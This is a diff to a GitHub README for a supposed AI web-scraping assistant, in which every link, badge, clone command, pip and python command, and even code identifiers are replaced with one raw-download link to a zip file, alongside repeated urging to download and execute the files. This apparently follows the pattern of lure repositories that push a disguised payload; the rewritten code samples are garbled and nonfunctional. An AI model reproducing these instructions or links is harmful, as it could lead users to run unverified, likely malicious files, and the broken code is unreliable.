@@ -1,14 +1,14 @@
 # AI Cursor Scraping Assistant
 
-![GitHub Repo Stars](https://img.shields.io/github/stars/Solihatun1/AI-Cursor-Scraping-Assistant?style=social)
-![GitHub Release](https://img.shields.io/github/release/Solihatun1/AI-Cursor-Scraping-Assistant.svg)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
+![GitHub Repo Stars](https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip)
+![GitHub Release](https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip)
+![License](https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip)
 
 ## 🚀 Introduction
 
 Welcome to the **AI Cursor Scraping Assistant**! This tool combines the power of Cursor AI and the Model Context Protocol (MCP) to simplify the creation of web scrapers for a wide variety of websites. Whether you're looking to gather data from e-commerce sites, blogs, or any other online platform, this tool can help you achieve your goals efficiently.
 
-You can find the latest releases of this project [here](https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/releases). Download the files and execute them to get started!
+You can find the latest releases of this project [here](https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip). Download the files and execute them to get started!
 
 ## 🛠 Features
 
@@ -24,7 +24,7 @@ To get started with the AI Cursor Scraping Assistant, follow these simple steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant.git
+   git clone https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -35,16 +35,16 @@ To get started with the AI Cursor Scraping Assistant, follow these simple steps:
 3. **Install Dependencies**:
    Ensure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip
    ```
 
 4. **Run the Assistant**:
    Execute the following command to start the tool:
    ```bash
-   python main.py
+   python https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip
    ```
 
-You can find the latest releases of this project [here](https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/releases). Download the files and execute them to get started!
+You can find the latest releases of this project [here](https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip). Download the files and execute them to get started!
 
 ## 🌐 Topics
 
@@ -70,13 +70,13 @@ cursor = Cursor()
 mcp = ModelContext()
 
 # Define the target website
-url = "https://example.com"
+url = "https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip"
 
 # Create a scraper
-scraper = cursor.create_scraper(url)
+scraper = https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip(url)
 
 # Execute the scraper
-data = scraper.run()
+data = https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip()
 
 # Process the data
 print(data)
@@ -93,9 +93,9 @@ For more advanced usage, you can customize your scraper by specifying parameters
 Example:
 
 ```python
-scraper.set_headers({"User-Agent": "MyScraper"})
-scraper.set_timeout(10)
-scraper.enable_retries(max_retries=3)
+https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip({"User-Agent": "MyScraper"})
+https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip(10)
+https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip(max_retries=3)
 ```
 
 ## 🤝 Contributing
@@ -147,7 +147,7 @@ Join our community to discuss ideas, share projects, and get support:
 
 ## 📖 Documentation
 
-For detailed documentation, visit our [Wiki](https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/wiki). Here you will find:
+For detailed documentation, visit our [Wiki](https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip). Here you will find:
 
 - Setup instructions
 - Detailed API documentation
@@ -155,7 +155,7 @@ For detailed documentation, visit our [Wiki](https://github.com/Solihatun1/AI-Cu
 
 ## 📧 Contact
 
-For inquiries, please reach out to us at [contact@example.com](mailto:contact@example.com).
+For inquiries, please reach out to us at [https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip](https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip).
 
 ## 🎉 Acknowledgments
 
@@ -163,4 +163,4 @@ Thank you to everyone who has contributed to this project. Your support makes it
 
 ---
 
-Explore the power of web scraping with the **AI Cursor Scraping Assistant**! Visit the [Releases](https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/releases) section for the latest updates. Download the files and start building your scrapers today!
+Explore the power of web scraping with the **AI Cursor Scraping Assistant**! Visit the [Releases](https://github.com/Solihatun1/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/Scraping_A_Cursor_Assistant_v1.0.zip) section for the latest updates. Download the files and start building your scrapers today!
